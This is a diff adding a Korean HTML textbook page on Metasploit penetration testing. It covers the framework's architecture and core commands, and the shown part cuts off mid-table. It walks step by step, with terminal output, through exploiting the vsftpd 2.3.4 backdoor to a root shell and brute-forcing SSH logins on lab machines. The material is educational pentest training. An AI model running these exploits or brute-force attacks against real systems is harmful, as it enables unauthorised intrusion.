@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>메타스플로잇 프레임워크(MSF) 침투 테스트 및 취약점 분석 실무</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Pretendard:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #0f172a; /* Slate 900 for Security Theme */
+            --accent-color: #dc2626; /* Red 600 for Offensive Theme */
+            --text-main: #1f2937;
+            --text-muted: #4b5563;
+            --bg-page: #f8fafc;
+            --bg-card: #ffffff;
+            --terminal-bg: #1e1e1e;
+        }
+        
+        body {
+            font-family: 'Pretendard', -apple-system, BlinkMacSystemFont, system-ui, Roboto, 'Helvetica Neue', 'Segoe UI', 'Apple SD Gothic Neo', 'Noto Sans KR', 'Malgun Gothic', sans-serif;
+            background-color: var(--bg-page);
+            color: var(--text-main);
+            line-height: 1.8;
+            letter-spacing: -0.01em;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .textbook-container {
+            max-width: 1200px;
+            margin: 60px auto;
+            background-color: var(--bg-card);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
+            border-radius: 16px;
+            padding: 80px 100px;
+        }
+
+        /* 문서 메인 타이틀 전용 스타일 */
+        .document-header {
+            text-align: center;
+            margin-bottom: 100px;
+            padding-bottom: 60px;
+            border-bottom: 2px solid #e2e8f0;
+            position: relative;
+        }
+
+        .document-header::after {
+            content: '';
+            position: absolute;
+            bottom: -3px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 120px;
+            height: 6px;
+            background-color: var(--accent-color);
+            border-radius: 4px;
+        }
+
+        .category-badge {
+            display: inline-block;
+            background-color: #fef2f2;
+            color: var(--accent-color);
+            padding: 10px 24px;
+            border-radius: 999px;
+            font-weight: 800;
+            font-size: 1.1rem;
+            margin-bottom: 28px;
+            letter-spacing: 0.05em;
+            border: 1px solid #fecaca;
+            box-shadow: 0 4px 6px -1px rgba(220, 38, 38, 0.1);
+        }
+
+        .main-title {
+            font-size: 3.8rem;
+            font-weight: 900;
+            color: #0f172a;
+            line-height: 1.25;
+            letter-spacing: -0.03em;
+            margin-bottom: 30px;
+            word-break: keep-all;
+        }
+
+        .sub-title {
+            font-size: 1.45rem;
+            color: #64748b;
+            font-weight: 500;
+            word-break: keep-all;
+            line-height: 1.6;
+        }
+
+        .page-break {
+            margin-bottom: 120px;
+            padding-bottom: 80px;
+            border-bottom: 2px solid #e2e8f0;
+        }
+
+        .page-break:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        h2 {
+            font-size: 2.75rem;
+            font-weight: 900;
+            color: #0f172a;
+            margin-bottom: 50px;
+            padding-bottom: 20px;
+            border-bottom: 4px solid var(--primary-color);
+            line-height: 1.3;
+            word-break: keep-all;
+        }
+
+        h3 {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-top: 60px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+        }
+
+        h3::before {
+            content: "";
+            display: inline-block;
+            width: 6px;
+            height: 28px;
+            background-color: var(--accent-color);
+            margin-right: 14px;
+            border-radius: 4px;
+        }
+        
+        h4.step-title {
+            font-size: 1.4rem;
+            font-weight: 800;
+            color: #1e293b;
+            margin-top: 40px;
+            margin-bottom: 16px;
+            background-color: #f1f5f9;
+            padding: 12px 20px;
+            border-left: 4px solid #3b82f6;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .block-sentence {
+            background: linear-gradient(145deg, #f8fafc 0%, #f1f5f9 100%);
+            border-left: 6px solid var(--accent-color);
+            padding: 32px 40px;
+            margin: 40px 0;
+            font-size: 1.25rem;
+            font-weight: 500;
+            color: #334155;
+            border-radius: 0 12px 12px 0;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
+            word-break: keep-all;
+            line-height: 1.9;
+        }
+
+        .diagram-box {
+            background-color: #f8fafc;
+            border: 2px dashed #cbd5e1;
+            border-radius: 16px;
+            padding: 60px 40px;
+            margin: 60px 0;
+            text-align: center;
+            color: #64748b;
+            font-size: 1.15rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+
+        .diagram-caption {
+            display: block;
+            margin-top: 24px;
+            font-size: 0.95rem;
+            color: #94a3b8;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0;
+            margin: 50px 0;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.02);
+        }
+
+        th, td {
+            padding: 24px 30px;
+            text-align: left;
+            border-bottom: 1px solid #e2e8f0;
+            border-right: 1px solid #e2e8f0;
+            line-height: 1.7;
+        }
+
+        th:last-child, td:last-child {
+            border-right: none;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        th {
+            background-color: var(--primary-color);
+            color: #ffffff;
+            font-weight: 700;
+            font-size: 1.15rem;
+            letter-spacing: 0.02em;
+        }
+
+        td {
+            font-size: 1.1rem;
+            color: var(--text-muted);
+            background-color: #ffffff;
+        }
+
+        tr:nth-child(even) td {
+            background-color: #f8fafc;
+        }
+        
+        /* 한 줄 분석 전용 테이블 스타일 */
+        .line-analysis-table th {
+            background-color: #334155;
+            padding: 16px 20px;
+        }
+        .line-analysis-table td {
+            padding: 16px 20px;
+            font-size: 1.05rem;
+        }
+        .line-code {
+            font-family: 'D2Coding', 'Consolas', monospace;
+            background-color: #f1f5f9;
+            color: #be185d;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.95rem;
+            display: inline-block;
+            word-break: break-all;
+        }
+
+        .notice-box {
+            background-color: #fef2f2;
+            border: 1px solid #fecaca;
+            border-left: 8px solid #ef4444;
+            padding: 30px 40px;
+            margin-top: 50px;
+            border-radius: 8px 12px 12px 8px;
+            box-shadow: 0 10px 15px -3px rgba(239, 68, 68, 0.1);
+        }
+
+        .notice-title {
+            color: #991b1b;
+            font-weight: 800;
+            font-size: 1.25rem;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+        }
+
+        .notice-title::before {
+            content: "⚠️";
+            margin-right: 10px;
+            font-size: 1.4rem;
+        }
+
+        .notice-text {
+            color: #7f1d1d;
+            font-size: 1.1rem;
+            line-height: 1.8;
+            word-break: keep-all;
+        }
+
+        ul {
+            list-style-type: none;
+            padding: 0;
+            margin-bottom: 40px;
+        }
+
+        ul li {
+            position: relative;
+            padding-left: 36px;
+            margin-bottom: 24px;
+            font-size: 1.15rem;
+            color: var(--text-muted);
+            line-height: 1.8;
+            word-break: keep-all;
+        }
+
+        ul li::before {
+            content: "■";
+            position: absolute;
+            left: 0;
+            color: var(--accent-color);
+            font-size: 0.9rem;
+            top: 6px;
+        }
+
+        .highlight {
+            background-color: #fef08a;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-weight: 700;
+            color: #854d0e;
+        }
+
+        .code-inline {
+            background-color: #1e293b;
+            color: #38bdf8;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-family: 'D2Coding', 'Consolas', monospace;
+            font-size: 1.05rem;
+            font-weight: 500;
+            letter-spacing: 0.02em;
+        }
+        
+        .terminal-box {
+            background-color: #121212;
+            border-radius: 12px;
+            shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            margin: 30px 0;
+            border: 1px solid #2d2d2d;
+            text-align: left;
+        }
+        .terminal-header {
+            background-color: #2d2d2d;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #000000;
+        }
+        .terminal-body {
+            padding: 24px;
+            font-family: 'D2Coding', 'Consolas', monospace;
+            font-size: 1.05rem;
+            line-height: 1.7;
+            color: #d4d4d4;
+            background-color: #1e1e1e;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+        .cmd-prompt { color: #4af626; font-weight: bold; }
+        .cmd-path { color: #a5a5a5; font-weight: normal; text-decoration: underline; }
+        .cmd-output { color: #d4d4d4; }
+        .cmd-success { color: #a6e3a1; }
+        .cmd-highlight { color: #ce9178; }
+        .cmd-warning { color: #f9e2af; }
+        .cmd-error { color: #f38ba8; }
+
+        .footnote {
+            font-size: 0.95rem;
+            color: #64748b;
+            border-top: 1px dashed #cbd5e1;
+            padding-top: 12px;
+            margin-top: 20px;
+        }
+
+        a {
+            color: var(--accent-color);
+            text-decoration: none;
+            border-bottom: 1px solid var(--accent-color);
+            padding-bottom: 2px;
+            transition: color 0.2s, border-color 0.2s;
+        }
+
+        a:hover {
+            color: #991b1b;
+            border-color: #991b1b;
+        }
+    </style>
+</head>
+<body>
+
+<div class="textbook-container">
+
+    <!-- 문서 메인 타이틀 영역 -->
+    <div class="document-header">
+        <div class="category-badge">엔터프라이즈 모의 해킹 및 오펜시브 시큐리티 시리즈</div>
+        <h1 class="main-title">메타스플로잇 프레임워크(MSF)<br>침투 테스트 및 취약점 분석 실무</h1>
+        <p class="sub-title">Rapid7 공식 아키텍처 기반 취약점 진단(Vulnerability Assessment)부터<br>포스트 익스플로잇(Post-Exploitation, 시스템 장악 후 활동)까지의 완벽 가이드</p>
+    </div>
+
+    <!-- 1페이지: 메타스플로잇 아키텍처 및 코어 개념 -->
+    <div class="page-break">
+        <h2>1. 메타스플로잇 프레임워크 핵심 아키텍처 이해</h2>
+        
+        <div class="block-sentence">
+            <a href="https://www.rapid7.com/products/metasploit/" target="_blank">MSF (Metasploit Framework, 메타스플로잇 프레임워크)</a>는 IT 인프라에 존재하는 취약점을 검증하고, 모의 해킹(Penetration Testing, 침투 테스트)을 자동화하기 위해 설계된 세계 표준 오픈소스 보안 플랫폼입니다.
+        </div>
+
+        <div class="diagram-box">
+            <!-- 시각화 도식: MSF 코어 아키텍처 -->
+            <div class="flex flex-col items-center justify-center gap-6 py-4 font-sans max-w-4xl mx-auto">
+                <!-- User Interfaces -->
+                <div class="bg-slate-800 text-white w-full rounded-xl p-4 shadow-lg border border-slate-700">
+                    <h4 class="font-bold text-center mb-2">접점 인터페이스 (User Interfaces)</h4>
+                    <div class="flex justify-center gap-4 text-sm font-mono">
+                        <span class="bg-slate-600 px-4 py-2 rounded">msfconsole</span>
+                        <span class="bg-slate-600 px-4 py-2 rounded">msfvenom</span>
+                        <span class="bg-slate-600 px-4 py-2 rounded">Armitage (GUI)</span>
+                    </div>
+                </div>
+                
+                <div class="text-3xl text-slate-400 font-black rotate-90 my-2">➔</div>
+                
+                <!-- Core & Base -->
+                <div class="w-full flex gap-4">
+                    <div class="bg-indigo-900 text-white flex-1 rounded-xl p-6 shadow-lg border border-indigo-700 flex items-center justify-center font-bold text-xl">
+                        MSF Core / Base (루비 엔진)
+                    </div>
+                </div>
+
+                <div class="text-3xl text-slate-400 font-black rotate-90 my-2">➔</div>
+
+                <!-- Modules -->
+                <div class="w-full bg-slate-100 p-6 rounded-xl border border-slate-300 shadow-inner">
+                    <h4 class="font-bold text-center text-slate-700 mb-4 border-b border-slate-300 pb-2">기능별 모듈 (Modules)</h4>
+                    <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm text-center font-bold">
+                        <div class="bg-rose-100 text-rose-800 p-4 rounded border border-rose-200">Exploits<br><span class="text-xs font-normal">취약점 공격 코드</span></div>
+                        <div class="bg-orange-100 text-orange-800 p-4 rounded border border-orange-200">Payloads<br><span class="text-xs font-normal">침투 후 실행 악성코드</span></div>
+                        <div class="bg-emerald-100 text-emerald-800 p-4 rounded border border-emerald-200">Auxiliary<br><span class="text-xs font-normal">스캐닝 및 정보 수집</span></div>
+                        <div class="bg-purple-100 text-purple-800 p-4 rounded border border-purple-200">Post<br><span class="text-xs font-normal">침투 성공 후 권한 유지</span></div>
+                    </div>
+                </div>
+            </div>
+            <span class="diagram-caption"> ※ MSF 사용자는 msfconsole 인터페이스를 통해 Core 엔진에 명령을 내리고, 각 기능별 모듈을 조합하여 타겟을 공격합니다.</span>
+        </div>
+
+        <div class="block-sentence">
+            시스템 관리자와 아키텍트는 단순한 도구 사용법을 넘어, 공격자가 <strong>Exploit(익스플로잇, 취약점 공격 코드)</strong>을 통해 방화벽을 우회하고 <strong>Payload(페이로드, 공격 성공 후 실행되는 악성 코드)</strong>를 메모리에 적재하는 전체 프로세스의 아키텍처를 이해해야만 완벽한 방어망을 설계할 수 있습니다.
+        </div>
+
+        <table>
+            <thead>
+                <tr>
+                    <th style="width: 20%;">핵심 모듈 명칭</th>
+                    <th style="width: 25%;">원어 및 한글 의미</th>
+                    <th style="width: 55%;">기능 상세 설명 및 실무 역할</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td class="font-bold text-rose-700 bg-rose-50">Exploit</td>
+                    <td>취약점 공격 코드</td>
+                    <td>타겟 시스템(OS, 웹 서버, FTP 등)의 소프트웨어 버그나 설계상 결함을 찌르고 들어가, 보안 통제를 무력화하는 해킹의 첫 번째 단계 '문 열기' 역할을 수행합니다.</td>
+                </tr>
+                <tr>
+                    <td class="font-bold text-orange-700 bg-orange-50">Payload</td>
+                    <td>적재물 (실행 악성코드)</td>
+                    <td>Exploit이 문을 열어주면, 그 틈으로 시스템 내부에 전달되어 실제로 파괴적인 동작(백도어 설치, 데이터 유출, 셸 획득)을 수행하는 실질적인 '폭탄'입니다.</td>
+                </tr>
+                <tr>
+                    <td class="font-bold text-emerald-700 bg-emerald-50">Auxiliary</td>
+                    <td>보조 모듈 (스캐너)</td>
+                    <td>직접적인 공격(Exploit)을 수행하지 않고, 타겟 시스템의 열린 포트나 취약점 존재 여부를 확인하는 스캐닝(Scanning)과 정보 수집(Footprinting, 풋프린팅)을 담당합니다.</td>
+                </tr>
+            </tbody>
+        </table>
+        
+        <div class="notice-box">
+            <div class="notice-title">AWS 클라우드 환경 침투 테스트 시 윤리 및 과금 경고</div>
+            <div class="notice-text">
+                AWS(Amazon Web Services, 아마존 웹 서비스) 환경에 구축된 EC2(Elastic Compute Cloud, 크기 조정 가능한 컴퓨팅 용량) 인스턴스에서 MSF를 구동하는 것 자체는 기본 인프라 비용 외에 추가 과금이 발생하지 않습니다.
+                <br><br>
+                하지만, <strong>자신이 소유하지 않은 타인의 IP나 외부 공인 IP를 향해 포트 스캐닝(Auxiliary)이나 익스플로잇(Exploit)을 시도하는 행위는 AWS AUP(Acceptable Use Policy, 허용되는 사용 정책) 위반으로 즉시 계정이 영구 정지(Suspension)될 수 있습니다.</strong> 실습은 반드시 로컬 가상 머신(VirtualBox, VMware 등) 내부의 사설 IP 망에서만 진행하십시오.
+            </div>
+        </div>
+    </div>
+
+    <!-- 2페이지: 실무 워크플로우 및 필수 명령어 -->
+    <div class="page-break">
+        <h2>2. 모의 해킹 실무 워크플로우 및 CLI 필수 명령어</h2>
+        
+        <div class="block-sentence">
+            MSF의 가장 강력하고 표준적인 인터페이스는 CLI(Command Line Interface, 텍스트 명령줄 인터페이스) 환경인 <span class="code-inline">msfconsole</span>입니다. 모의 해킹은 철저한 절차(정보 수집 → 모듈 검색 → 옵션 설정 → 공격 실행)에 따라 단계별로 진행됩니다.
+        </div>
+
+        <div class="diagram-box">
+            <!-- 시각화 도식: 워크플로우 -->
+            <div class="flex flex-col md:flex-row items-center justify-center gap-4 py-8 font-sans">
+                <div class="bg-slate-100 p-4 rounded-xl shadow border border-slate-300 w-48 font-bold text-slate-700">1. 대상 스캐닝<br><span class="text-xs font-normal">Nmap / Auxiliary</span></div>
+                <div class="text-2xl text-slate-400 font-black rotate-90 md:rotate-0">➔</div>
+                <div class="bg-slate-100 p-4 rounded-xl shadow border border-slate-300 w-48 font-bold text-slate-700">2. 모듈 검색<br><span class="text-xs font-normal">search 명령어</span></div>
+                <div class="text-2xl text-slate-400 font-black rotate-90 md:rotate-0">➔</div>
+                <div class="bg-slate-100 p-4 rounded-xl shadow border border-slate-300 w-48 font-bold text-slate-700">3. 옵션 세팅<br><span class="text-xs font-normal">set RHOSTS 등</span></div>
+                <div class="text-2xl text-slate-400 font-black rotate-90 md:rotate-0">➔</div>
+                <div class="bg-red-100 p-4 rounded-xl shadow border border-red-300 w-48 font-bold text-red-700">4. 공격 및 장악<br><span class="text-xs font-normal">exploit 명령어</span></div>
+            </div>
+            <span class="diagram-caption"> ※ 성공적인 침투 테스트를 위해 반드시 거쳐야 하는 4단계 표준 워크플로우(Standard Workflow)입니다.</span>
+        </div>
+
+        <div class="block-sentence">
+            프레임워크 내부에서 길을 잃지 않으려면 아래의 5가지 핵심 명령어를 완벽히 숙지해야 합니다. 이 명령어들은 모든 취약점 진단 시나리오에서 변함없이 공통으로 적용되는 절대적인 워크플로우(Workflow, 작업 흐름)입니다.
+        </div>
+
+        <h3>필수 명령어(Commands) 명세서</h3>
+        <table>
+            <thead>
+                <tr>
+                    <th style="width: 20%;">명령어</th>
+                    <th style="width: 25%;">기능 설명</th>
+                    <th style="width: 55%;">실무 활용 예시 및 팁</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td class="font-bold text-slate-900 code-inline bg-slate-100 border-0">search [키워드]</td>
+                    <td>모듈 검색</td>
+                    <td>Nmap(네트워크 스캐너)으로 확인된 서비스 이름(예: Apache, ProFTPD, Windows 10)을 입력하여 관련 Exploit을 찾습니다.<br><span class="highlight mt-2 inline-block">팁: search type:exploit platform:windows</span> 처럼 필터를 걸 수 있습니다.</td>
+                </tr>
+                <tr>
+                    <td class="font-bold text-slate-900 code-inline bg-slate-100 border-0">use [경로/번호]</td>
+                    <td>모듈 장착</td>
+                    <td>검색된 결과 목록 중 사용할 취약점 코드를 선택하여 장착합니다.<br>예: <span class="code-inline">use exploit/windows/smb/ms17_010_eternalblue</span></td>
+                </tr>
+                <tr>
+                    <td class="font-bold text-slate-900 code-inline bg-slate-100 border-0">show options</td>
+                    <td>필수 옵션 확인</td>
+                    <td>선택한 공격 코드가 작동하기 위해 반드시 입력해야 하는 설정값(IP, Port 등) 목록과 현재 설정 상태를 출력합니다. 'Required' 열이 'yes'인 항목은 빈칸으로 두면 공격이 실행되지 않습니다.</td>
+                </tr>
+                <tr>
+                    <td class="font-bold text-slate-900 code-inline bg-slate-100 border-0">set [변수명] [값]</td>
+                    <td>옵션 값 설정</td>
+                    <td>공격 대상의 IP(RHOSTS)나 공격자의 IP(LHOST)를 환경 변수에 세팅합니다.<br>예: <span class="code-inline">set RHOSTS 192.168.0.50</span></td>
+                </tr>
+                <tr>
+                    <td class="font-bold text-slate-900 code-inline bg-slate-100 border-0">exploit (또는 run)</td>
+                    <td>공격 개시</td>
+                    <td>모든 설정이 완료된 후, 취약점 공격 코드를 타겟으로 발사합니다. 성공 시 셸(Shell, 제어 권한) 세션이 열립니다.</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- 3페이지: 실전 시나리오 1 - vsftpd 백도어 -->
+    <div class="page-break">
+        <h2>3. 실전 모의 해킹 시나리오 I: vsftpd 백도어 침투</h2>
+        
+        <div class="block-sentence">
+            가장 직관적이고 대표적인 취약점인 <strong>vsftpd 2.3.4 Backdoor (백도어, 뒷문) Command Execution</strong> 모듈을 활용하여, 타겟 시스템에 침투하고 최고 관리자(root) 셸(Shell)을 획득하는 전 과정을 단계별로 실습합니다.
+        </div>
+
+        <h4 class="step-title">Step 1. 프레임워크 실행 및 모듈 검색</h4>
+        <div class="terminal-box">
+            <div class="terminal-header">
+                <div class="flex gap-2"><div class="w-3.5 h-3.5 rounded-full bg-[#ff5f56]"></div><div class="w-3.5 h-3.5 rounded-full bg-[#ffbd2e]"></div><div class="w-3.5 h-3.5 rounded-full bg-[#27c93f]"></div></div>
+                <div class="text-[0.8rem] text-slate-400 font-sans font-bold">root@kali:~</div><div class="w-12"></div>
+            </div>
+            <div class="terminal-body">
+┌──(root㉿kali)-[~]
+└─# <span class="cmd-prompt">msfconsole -q</span>
+<span class="cmd-prompt"><span class="cmd-path">msf6</span> ></span> search vsftpd
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+            </div>
+        </div>
+
+        <table class="line-analysis-table">
+            <thead><tr><th style="width: 30%;">실행 명령어 및 출력 결과</th><th style="width: 70%;">한 줄 분석 (Line-by-Line Analysis)</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td><span class="line-code">msfconsole -q</span></td>
+                    <td>메타스플로잇 프레임워크의 대화형 콘솔(CLI) 환경을 시작합니다. <span class="highlight">-q (quiet)</span> 옵션을 주면 초기 실행 시 나타나는 무거운 배너(아스키 아트 그림) 출력을 생략하고 빠르게 프롬프트를 띄웁니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">search vsftpd</span></td>
+                    <td>로컬 데이터베이스에 저장된 수많은 모듈 중에서 'vsftpd'와 관련된 취약점 모듈만을 빠르고 정확하게 필터링하여 검색합니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">Rank: excellent</span></td>
+                    <td>해당 취약점 공격 코드의 신뢰도를 나타냅니다. <strong>excellent (매우 높음)</strong> 등급은 타겟 시스템을 다운(Crash)시키지 않고 안정적으로 권한을 획득할 확률이 가장 높은, 검증된 Exploit임을 의미합니다.</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h4 class="step-title">Step 2. 모듈 장착 및 타겟(RHOSTS) 설정</h4>
+        <div class="terminal-box">
+            <div class="terminal-header">
+                <div class="flex gap-2"><div class="w-3.5 h-3.5 rounded-full bg-[#ff5f56]"></div><div class="w-3.5 h-3.5 rounded-full bg-[#ffbd2e]"></div><div class="w-3.5 h-3.5 rounded-full bg-[#27c93f]"></div></div>
+                <div class="text-[0.8rem] text-slate-400 font-sans font-bold">msfconsole</div><div class="w-12"></div>
+            </div>
+            <div class="terminal-body">
+<span class="cmd-prompt"><span class="cmd-path">msf6</span> ></span> use exploit/unix/ftp/vsftpd_234_backdoor
+<span class="cmd-highlight">[*] No payload configured, defaulting to cmd/unix/interact</span>
+<span class="cmd-prompt"><span class="cmd-path">msf6 exploit(unix/ftp/vsftpd_234_backdoor)</span> ></span> set RHOSTS 192.168.50.100
+RHOSTS => 192.168.50.100
+<span class="cmd-prompt"><span class="cmd-path">msf6 exploit(unix/ftp/vsftpd_234_backdoor)</span> ></span> show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   CHOST                    no        The local client address
+   CPORT                    no        The local client port
+   RHOSTS  192.168.50.100   yes       The target host(s), see https://docs.metasploit.com/
+   RPORT   21               yes       The target port (TCP)
+            </div>
+        </div>
+
+        <table class="line-analysis-table">
+            <thead><tr><th style="width: 30%;">실행 명령어 및 출력 결과</th><th style="width: 70%;">한 줄 분석 (Line-by-Line Analysis)</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td><span class="line-code">use exploit/...</span></td>
+                    <td>식별된 경로의 공격 모듈을 시스템 메모리에 로드(장착)합니다. 프롬프트가 <span class="highlight">msf6 exploit(...) ></span> 형태로 변경되어 해당 모듈 컨텍스트 안으로 성공적으로 진입했음을 시각적으로 나타냅니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">set RHOSTS 192.168...</span></td>
+                    <td><strong>RHOSTS (Remote Hosts, 원격 타겟 시스템 호스트)</strong> 변수를 설정합니다. 즉, 우리가 공격할 희생자 서버의 IP 주소를 지정하는 가장 중요한 핵심 단계입니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">show options</span></td>
+                    <td>현재 모듈에서 요구하는 설정값(IP, Port 등) 목록을 출력합니다. 'Required(필수)' 열이 'yes'인 <span class="line-code">RHOSTS</span>와 <span class="line-code">RPORT(21번)</span>가 정상적으로 세팅되었는지 공격 전 최종 검증합니다.</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h4 class="step-title">Step 3. 익스플로잇(Exploit) 실행 및 권한 획득</h4>
+        <div class="terminal-box">
+            <div class="terminal-header">
+                <div class="flex gap-2"><div class="w-3.5 h-3.5 rounded-full bg-[#ff5f56]"></div><div class="w-3.5 h-3.5 rounded-full bg-[#ffbd2e]"></div><div class="w-3.5 h-3.5 rounded-full bg-[#27c93f]"></div></div>
+                <div class="text-[0.8rem] text-slate-400 font-sans font-bold">msfconsole</div><div class="w-12"></div>
+            </div>
+            <div class="terminal-body">
+<span class="cmd-prompt"><span class="cmd-path">msf6 exploit(unix/ftp/vsftpd_234_backdoor)</span> ></span> exploit
+
+<span class="cmd-highlight">[*] 192.168.50.100:21 - Banner: 220 (vsFTPd 2.3.4)</span>
+<span class="cmd-highlight">[*] 192.168.50.100:21 - USER: 331 Please specify the password.</span>
+<span class="cmd-success">[+] 192.168.50.100:21 - Backdoor service has been spawned, handling...</span>
+<span class="cmd-success">[+] 192.168.50.100:21 - UID: uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="cmd-success">[*] Found shell.</span>
+<span class="cmd-success">[*] Command shell session 1 opened (192.168.50.10:39485 -> 192.168.50.100:6200) at 2026-03-18 05:30:00 +0900</span>
+
+whoami
+<span class="cmd-output">root</span>
+hostname
+<span class="cmd-output">metasploitable</span>
+            </div>
+        </div>
+
+        <table class="line-analysis-table">
+            <thead><tr><th style="width: 30%;">실행 명령어 및 출력 결과</th><th style="width: 70%;">한 줄 분석 (Line-by-Line Analysis)</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td><span class="line-code">exploit</span></td>
+                    <td>설정된 값들을 바탕으로 타겟 시스템을 향해 실제 취약점 공격 코드를 발사(개시)합니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">Banner: 220 (vsFTPd...)</span></td>
+                    <td>공격 코드를 실행하기 전, 대상 포트(21번)에 접속하여 구동 중인 데몬의 버전이 취약한 2.3.4 버전이 맞는지 <span class="highlight">Banner Grabbing(배너 그래빙, 서비스 정보 수집)</span>을 수행하여 확인합니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">Backdoor service spawned</span></td>
+                    <td>vsftpd 2.3.4 소스코드에 심어져 있던 백도어 로직(USER 명령에 <code>:)</code> 이모티콘 전송 시 6200 포트 개방)을 성공적으로 발동(Spawn)시켰음을 의미합니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">UID: uid=0(root)</span></td>
+                    <td>열린 6200 포트로 접속해보니, 해당 프로세스가 리눅스 시스템의 최고 관리자인 <span class="highlight">root (사용자 식별자 0번)</span> 권한으로 실행되고 있음을 확인했습니다. 치명적인 시스템 장악 단계입니다.</td>
+                </tr>
+                <tr>
+                    <td><span class="line-code">Session 1 opened</span></td>
+                    <td>공격자 PC와 타겟 서버 간의 백그라운드 연결 채널(세션 1)이 성공적으로 생성되었습니다. 이제 <span class="line-code">whoami</span> 등 임의의 OS 명령어를 타겟 서버에서 마음대로 실행할 수 있습니다.</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- 4페이지: 실전 시나리오 2 - SSH 무차별 대입 -->
+    <div class="page-break">
+        <h2>4. 실전 모의 해킹 시나리오 II: Auxiliary 스캐너 활용</h2>
+        
+        <div class="block-sentence">
+            운영체제나 서비스에 명백한 소프트웨어 결함(Exploit)이 없을 때 해커들이 가장 많이 사용하는 방법은 바로 <strong>Authentication Brute Force (인증 무차별 대입 공격)</strong>입니다. MSF의 <strong>Auxiliary(보조 모듈)</strong> 기능을 활용하여 SSH 서버의 취약한 패스워드를 알아내는 과정을 실습합니다.
+        </div>
+
+        <div class="terminal-box">
+            <div class="terminal-header">
+                <div class="flex gap-2"><div class="w-3.5 h-3.5 rounded-full bg-[#ff5f56]"></div><div class="w-3.5 h-3.5 rounded-full bg-[#ffbd2e]"></div><div class="w-3.5 h-3.5 rounded-full bg-[#27c93f]"></div></div>
+                <div class="text-[0.8rem] text-slate-400 font-sans font-bold">msfconsole</div><div class="w-12"></div>
+            </div>
+            <div class="terminal-body">
+<span class="cmd-prompt"><span class="cmd-path">msf6</span> ></span> use auxiliary/scanner/ssh/ssh_login
+<span class="cmd-prompt"><span class="cmd-path">msf6 auxiliary(scanner/ssh/ssh_login)</span> ></span> set RHOSTS 192.168.50.101
+RHOSTS => 192.168.50.101
+<span class="cmd-prompt"><span class="cmd-path">msf6 auxiliary(scanner/ssh/ssh_login)</span> ></span> set USER_FILE /root/users.txt
+USER_FILE => /root/users.txt
+<span class="cmd-prompt"><span class="cmd-path">msf6 auxiliary(scanner/ssh/ssh_login)</span> ></span> set PASS_FILE /root/passwords.txt
+PASS_FILE => /root/passwords.txt
+<span class="cmd-prompt"><span class="cmd-path">msf6 auxiliary(scanner/ssh/ssh_login)</span> ></span> run
+
+<span class="cmd-highlight">[*] 192.168.50.101:22 - Starting bruteforce</span>
+<span class="cmd-error">[-] 192.168.50.101:22 - Failed: 'admin:12345'</span>
+<span class="cmd-error">[-] 192.168.50.101:22 - Failed: 'admin:password'</span>
+<span class="cmd-success">[+] 192.168.50.101:22 - Success: 'admin:admin123' 'uid=1000(admin) gid=1000(admin)'</span>
+<span class="cmd-highlight">[*] Command shell session 2 opened (192.168.50.10:48211 -> 192.168.50.101:22)</span>
+<span class="cmd-success">[*] Scanned 1 of 1 hosts (100% complete)</span>
+<span class="cmd-highlight">[*] Auxiliary module execution completed</span>
+            </div>
+        </div>
+
+        <table class="line-analysis-table">
+            <thead><tr><th style="width: 30%;">실행 명령어 및 출력 결과</th><th style="width: 70%;">한 줄 분석 (Line-by-Line Analysis)</th></tr></thead>
+            <tbody>
+                <tr>
